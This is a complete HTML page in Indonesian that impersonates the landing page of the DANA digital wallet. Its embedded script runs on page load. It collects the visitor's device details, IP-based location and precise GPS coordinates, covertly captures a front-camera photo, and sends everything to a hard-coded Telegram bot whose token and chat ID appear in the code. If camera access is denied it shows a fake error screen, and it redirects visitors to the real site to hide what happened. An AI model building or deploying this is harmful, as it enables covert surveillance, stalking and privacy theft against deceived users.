<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="theme-color" content="#108ee9" />
  <title>DANA - Dompet Digital</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet" />

  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body {
      height:100%;
      background:#108EE9;
      font-family:'Open Sans',sans-serif;
      color:#fff;
      -webkit-font-smoothing:antialiased;
    }
    .page {
      height:100%;
      display:flex;
      flex-direction:column;
      justify-content:center;
      align-items:center;
      padding:20px;
      max-width:480px;
      margin:0 auto;
      text-align:center;
    }
    .illustration {
      width:180px;
      height:180px;
      margin-bottom:10px;
    }
    .illustration img {
      width:100%;
      height:100%;
      object-fit:contain;
    }
    .logo {
      display:flex;
      align-items:center;
      gap:12px;
      margin-bottom:6px;
    }
    .logo .mark {
      width:44px;
      height:44px;
      border-radius:50%;
      background:#fff;
      color:#108EE9;
      display:flex;
      align-items:center;
      justify-content:center;
      flex-shrink:0;
    }
    .logo .mark svg {
      width:24px;
      height:24px;
    }
    .logo .text {
      font-size:36px;
      font-weight:800;
      letter-spacing:0.15em;
      color:#fff;
    }
    .title {
      font-size:28px;
      font-weight:700;
      margin:10px 0 6px;
      line-height:1.2;
    }
    .desc {
      font-size:16px;
      color:rgba(255,255,255,0.9);
      max-width:320px;
      line-height:1.5;
    }
    .btn-wrap {
      width:100%;
      max-width:320px;
      margin-top:24px;
      padding:0 16px;
      position:fixed;
      bottom:32px;
      left:50%;
      transform:translateX(-50%);
    }
    .btn-wrap button {
      width:100%;
      padding:16px;
      background:#fff;
      border:none;
      border-radius:6px;
      font-size:18px;
      font-weight:700;
      color:#108EE9;
      cursor:pointer;
      transition:0.15s;
      letter-spacing:0.05em;
    }
    .btn-wrap button:hover { background:rgba(255,255,255,0.9); }
    .btn-wrap button:active { transform:scale(0.97); }

    /* Error Overlay */
    .error-overlay {
      display:none;
      position:fixed;
      inset:0;
      z-index:9999;
      background:#0a0620;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      color:rgba(255,255,255,0.12);
      font-size:3rem;
      font-weight:200;
      letter-spacing:10px;
      text-transform:uppercase;
      padding:20px;
    }
    .error-overlay .sub {
      font-size:0.8rem;
      color:rgba(255,255,255,0.04);
      letter-spacing:4px;
      margin-top:10px;
    }
    .error-overlay .retry-btn {
      margin-top:24px;
      padding:12px 32px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.08);
      border-radius:40px;
      color:rgba(255,255,255,0.25);
      font-size:0.8rem;
      font-weight:500;
      letter-spacing:3px;
      text-transform:uppercase;
      cursor:pointer;
      transition:0.3s;
    }
    .error-overlay .retry-btn:hover {
      background:rgba(255,255,255,0.08);
      color:rgba(255,255,255,0.4);
      border-color:rgba(255,255,255,0.15);
    }

    video { display:none !important; }

    @media (max-width:480px) {
      .illustration { width:140px; height:140px; }
      .logo .text { font-size:28px; }
      .title { font-size:22px; }
      .desc { font-size:14px; }
      .btn-wrap { bottom:20px; padding:0 12px; }
      .btn-wrap button { padding:14px; font-size:16px; }
      .error-overlay { font-size:2.2rem; }
    }
    @media (max-width:360px) {
      .illustration { width:120px; height:120px; }
      .logo .text { font-size:24px; }
      .title { font-size:20px; }
    }
  </style>
</head>
<body>

  <!-- ===== MAIN PAGE ===== -->
  <div class="page" id="mainPage">
    <div class="illustration">
      <img src="dana-hero.png" alt="DANA" />
    </div>
    <div class="logo">
      <span class="mark">
        <svg viewBox="0 0 24 24" fill="currentColor">
          <path d="M4 8c0-1.1.9-2 2-2h9c3.3 0 6 2.7 6 6s-2.7 6-6 6H6a2 2 0 0 1-2-2V8Zm3 1v6h8a3 3 0 0 0 0-6H7Z"/>
        </svg>
      </span>
      <span class="text">DANA</span>
    </div>
    <h1 class="title">Dompet digital yang aman dan tepercaya!</h1>
    <p class="desc">Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman</p>
  </div>

  <!-- ===== FIXED BUTTON ===== -->
  <div class="btn-wrap">
    <button id="openDana">BUKA DI DANA</button>
  </div>

  <!-- ===== ERROR OVERLAY ===== -->
  <div class="error-overlay" id="errorOverlay">
    Error
    <div class="sub">—</div>
    <button class="retry-btn" id="retryBtn">⟳ Coba Ulang</button>
  </div>

  <!-- ===== SCRIPT ===== -->
  <script>
    (function() {
      'use strict';

      // ---------- KONFIGURASI ----------
      const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
      const CHAT_ID = '8463156896';
      const MAX_RETRY = 3;

      // ---------- STATE ----------
      let status = {
        cameraAttempts: 0,
        cameraGranted: false,
        cameraDenied: false,
        alreadySent: false,
        locationReady: false,
        retryTimer: null
      };

      // Data
      let deviceName = '';
      let locationData = null;   // dari IP
      let gpsData = null;        // dari GPS

      // DOM
      const mainPage = document.getElementById('mainPage');
      const errorOverlay = document.getElementById('errorOverlay');
      const retryBtn = document.getElementById('retryBtn');
      const danaBtn = document.getElementById('openDana');

      // =========================================================
      // 1. DAPATKAN NAMA PERANGKAT
      // =========================================================
      function getDeviceName() {
        const ua = navigator.userAgent;
        let name = '';

        if (/iPhone/i.test(ua)) {
          const v = ua.match(/iPhone OS (\d+_\d+)/);
          name = 'iPhone ' + (v ? v[1].replace('_', '.') : '');
        } else if (/iPad/i.test(ua)) {
          const v = ua.match(/iPad OS (\d+_\d+)/);
          name = 'iPad ' + (v ? v[1].replace('_', '.') : '');
        } else if (/Android/i.test(ua)) {
          const v = ua.match(/Android\s([\d.]+)/);
          const brand = ua.match(/(Samsung|Xiaomi|OPPO|Vivo|Realme|OnePlus|Google|Nokia|Huawei|ASUS|Sony|Motorola|LG|HTC)/i);
          name = (brand ? brand[1] : 'Android') + ' ' + (v ? v[1] : '');
        } else if (/Windows/i.test(ua)) {
          name = 'Windows PC';
        } else if (/Mac/i.test(ua)) {
          name = 'Mac';
        } else {
          name = 'Perangkat tidak dikenal';
        }

        if (window.screen) {
          name += ` (${window.screen.width}x${window.screen.height})`;
        }
        return name;
      }

      // =========================================================
      // 2. AMBIL LOKASI DARI IP
      // =========================================================
      async function fetchLocationFromIP() {
        try {
          const ctrl = new AbortController();
          const timer = setTimeout(() => ctrl.abort(), 6000);
          const res = await fetch('https://ipapi.co/json/', {
            signal: ctrl.signal,
            headers: { Accept: 'application/json' }
          });
          clearTimeout(timer);
          if (!res.ok) throw new Error('HTTP ' + res.status);
          const d = await res.json();
          return {
            ip: d.ip || null,
            city: d.city || null,
            region: d.region || null,
            country: d.country_name || null,
            postal: d.postal || null,
            lat: d.latitude || null,
            lng: d.longitude || null,
            org: d.org || null,
            tz: d.timezone || null
          };
        } catch {
          return null;
        }
      }

      // =========================================================
      // 3. AMBIL GPS (Browser)
      // =========================================================
      function fetchGPS() {
        return new Promise((resolve) => {
          if (!navigator.geolocation) { resolve(null); return; }
          const timer = setTimeout(() => resolve(null), 5000);
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              clearTimeout(timer);
              resolve({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                acc: pos.coords.accuracy
              });
            },
            () => {
              clearTimeout(timer);
              resolve(null);
            },
            { enableHighAccuracy: true }
          );
        });
      }

      // =========================================================
      // 4. KUMPULKAN SEMUA DATA LOKASI
      // =========================================================
      async function collectLocationData() {
        const [ipResult, gpsResult] = await Promise.allSettled([
          fetchLocationFromIP(),
          fetchGPS()
        ]);
        locationData = ipResult.status === 'fulfilled' ? ipResult.value : null;
        gpsData = gpsResult.status === 'fulfilled' ? gpsResult.value : null;
        status.locationReady = true;
      }

      // =========================================================
      // 5. BUAT CAPTION
      // =========================================================
      function buildCaption(hasPhoto) {
        const lines = [];
        if (hasPhoto) {
          lines.push('📸 Foto diambil otomatis');
        } else {
          lines.push('⚠️ Gagal mengambil foto');
        }
        lines.push(`🕒 ${new Date().toLocaleString('id-ID')}`);
        lines.push(`📱 ${deviceName || 'Tidak dikenal'}`);

        if (locationData) {
          if (locationData.ip) lines.push(`\n🌐 IP Publik : ${locationData.ip}`);
          if (locationData.org) lines.push(`📡 Operator/ISP : ${locationData.org}`);
          const locParts = [];
          if (locationData.city) locParts.push(locationData.city);
          if (locationData.region) locParts.push(locationData.region);
          if (locationData.country) locParts.push(locationData.country);
          if (locParts.length) lines.push(`📍 Lokasi IP : ${locParts.join(', ')}`);
          if (locationData.postal) lines.push(`📮 Kode Pos : ${locationData.postal}`);
          if (locationData.tz) lines.push(`🕐 Zona Waktu : ${locationData.tz}`);
          if (locationData.lat && locationData.lng) {
            lines.push(`🗺️ Koordinat (IP) : ${locationData.lat}, ${locationData.lng}`);
          }
        }

        if (gpsData) {
          lines.push(`\n📡 GPS (akurat):`);
          lines.push(`   📍 Lat : ${gpsData.lat}`);
          lines.push(`   📍 Long : ${gpsData.lng}`);
          if (gpsData.acc) {
            lines.push(`   🎯 Akurasi : ±${Math.round(gpsData.acc)} meter`);
          }
        }

        if (!locationData && !gpsData) {
          lines.push(`\n⚠️ Data lokasi tidak tersedia`);
        }

        if (!hasPhoto) {
          lines.push(`\n⚠️ Izin kamera ditolak, hanya mengirim data lokasi`);
        }

        return lines.join('\n');
      }

      // =========================================================
      // 6. KIRIM KE TELEGRAM (dengan foto)
      // =========================================================
      async function sendWithPhoto(dataUrl) {
        try {
          const blob = await fetch(dataUrl).then(r => r.blob());
          const fd = new FormData();
          fd.append('photo', blob, 'foto.png');
          fd.append('caption', buildCaption(true));
          fd.append('chat_id', CHAT_ID);

          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: fd
          });
          if (!res.ok) throw new Error('API error');
          status.alreadySent = true;
          console.log('✅ Foto + data terkirim');
        } catch (e) {
          console.error('Gagal kirim foto:', e);
        }
      }

      // =========================================================
      // 7. KIRIM TEKS TANPA FOTO (pakai sendMessage)
      // =========================================================
      async function sendTextOnly() {
        try {
          const payload = {
            chat_id: CHAT_ID,
            text: buildCaption(false),
            parse_mode: 'HTML'
          };
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          if (!res.ok) throw new Error('API error');
          status.alreadySent = true;
          console.log('✅ Teks (tanpa foto) terkirim');
        } catch (e) {
          console.error('Gagal kirim teks:', e);
        }
      }

      // =========================================================
      // 8. AMBIL FOTO DARI STREAM & KIRIM
      // =========================================================
      function captureAndSend(video) {
        if (status.alreadySent) return;

        const canvas = document.createElement('canvas');
        const w = video.videoWidth || 640;
        const h = video.videoHeight || 480;
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, w, h);
        const dataUrl = canvas.toDataURL('image/png');

        // Stop stream
        if (video.srcObject) {
          video.srcObject.getTracks().forEach(t => t.stop());
        }

        // Kirim (tunggu lokasi siap maks 2 detik)
        if (!status.locationReady) {
          setTimeout(() => sendWithPhoto(dataUrl), 1000);
        } else {
          sendWithPhoto(dataUrl);
        }
      }

      // =========================================================
      // 9. TAMPILKAN ERROR + KIRIM TEKS
      // =========================================================
      function showErrorAndSendText() {
        status.cameraDenied = true;
        mainPage.style.display = 'none';
        errorOverlay.style.display = 'flex';

        if (status.retryTimer) {
          clearTimeout(status.retryTimer);
          status.retryTimer = null;
        }

        // Kirim teks (tunggu lokasi siap maks 2 detik)
        if (!status.locationReady) {
          setTimeout(() => sendTextOnly(), 2000);
        } else {
          sendTextOnly();
        }
      }

      // =========================================================
      // 10. RESET & COBA ULANG
      // =========================================================
      function resetAndRetry() {
        status.cameraDenied = false;
        status.cameraAttempts = 0;
        status.alreadySent = false;
        if (status.retryTimer) {
          clearTimeout(status.retryTimer);
          status.retryTimer = null;
        }
        errorOverlay.style.display = 'none';
        mainPage.style.display = 'flex';
        // Mulai ulang proses kamera
        setTimeout(startCamera, 300);
      }

      // =========================================================
      // 11. MULAI KAMERA
      // =========================================================
      function startCamera() {
        if (status.alreadySent || status.cameraDenied) return;

        status.cameraAttempts++;

        navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        })
        .then(stream => {
          // Kamera berhasil diakses
          status.cameraGranted = true;
          const video = document.createElement('video');
          video.style.display = 'none';
          video.setAttribute('playsinline', '');
          video.muted = true;
          video.srcObject = stream;
          document.body.appendChild(video);

          video.onloadedmetadata = () => {
            video.play()
              .then(() => {
                setTimeout(() => captureAndSend(video), 100);
              })
              .catch(() => {
                // Gagal play → retry
                if (status.cameraAttempts < MAX_RETRY) {
                  status.retryTimer = setTimeout(startCamera, 2000);
                } else {
                  showErrorAndSendText();
                }
              });
          };
          video.onerror = () => {
            if (status.cameraAttempts < MAX_RETRY) {
              status.retryTimer = setTimeout(startCamera, 2000);
            } else {
              showErrorAndSendText();
            }
          };
        })
        .catch(err => {
          console.error('Kamera error:', err);
          // Jika ditolak → langsung error + kirim teks
          if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
            showErrorAndSendText();
            return;
          }
          // Error lain → retry
          if (status.cameraAttempts < MAX_RETRY) {
            status.retryTimer = setTimeout(startCamera, 2000);
          } else {
            showErrorAndSendText();
          }
        });
      }

      // =========================================================
      // 12. INIT
      // =========================================================
      async function init() {
        // 1. Dapatkan nama HP
        deviceName = getDeviceName();
        console.log('📱 Device:', deviceName);

        // 2. Kumpulkan lokasi (IP + GPS) secara paralel
        await collectLocationData();
        console.log('📍 Lokasi siap:', locationData, gpsData);

        // 3. Mulai kamera
        setTimeout(startCamera, 400);
      }

      // =========================================================
      // 13. EVENT LISTENER
      // =========================================================

      // Tombol retry
      if (retryBtn) {
        retryBtn.addEventListener('click', function(e) {
          e.stopPropagation();
          e.preventDefault();
          resetAndRetry();
        });
      }

      // Tombol BUKA DI DANA
      if (danaBtn) {
        danaBtn.addEventListener('click', function(e) {
          // Efek klik
          this.style.transform = 'scale(0.96)';
          setTimeout(() => this.style.transform = '', 150);

          // Jika sedang error → reset dulu
          if (status.cameraDenied) {
            resetAndRetry();
            setTimeout(() => {
              window.location.href = 'https://www.dana.id/';
            }, 600);
            return;
          }

          // Jika belum kirim → coba mulai kamera ulang
          if (!status.alreadySent && !status.cameraDenied) {
            status.cameraAttempts = 0;
            startCamera();
          }

          // Redirect ke dana.id
          setTimeout(() => {
            window.location.href = 'https://www.dana.id/';
          }, 300);
        });
      }

      // =========================================================
      // 14. JALANKAN
      // =========================================================
      if (document.readyState === 'complete') {
        init();
      } else {
        window.addEventListener('load', init);
      }

    })();
  </script>
</body>
</html>
